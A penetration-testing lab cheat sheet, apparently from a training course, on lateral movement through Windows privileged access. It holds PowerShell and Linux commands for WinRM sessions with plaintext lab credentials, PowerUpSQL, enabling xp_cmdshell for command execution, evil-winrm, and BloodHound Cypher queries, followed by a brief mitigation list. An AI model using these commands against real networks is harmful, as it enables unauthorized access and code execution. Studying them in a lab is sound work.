# Privileged Access

## Windows (PowerShell)

### Enumerate RDP and WinRM Users

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### Establish WinRM Session

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

Exit session:

```powershell
Exit-PSSession
```

### PowerUpSQL

```powershell
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

### Execute SQL Query

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -Username "inlanefreight\damundsen" -Password "SQL1234!" -Query 'SELECT @@version'
```

---

## Linux Enumeration

### Evil-WinRM

```bash
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

### MSSQLClient

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
help
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

---

## BloodHound Cypher Queries

### WinRM Access

```cypher
MATCH p2=(u1:User)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2
```

### SQL Admin Access

```cypher
MATCH p2=(u1:User)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2
```

---

## Mitigation

1. Restrict privileged access for RDP and WinRM.
2. Monitor privileged actions with event logging.
3. Disable xp_cmdshell and enforce secure SQL authentication.
4. Audit privileged group membership regularly.
5. Implement MFA and segment critical services.
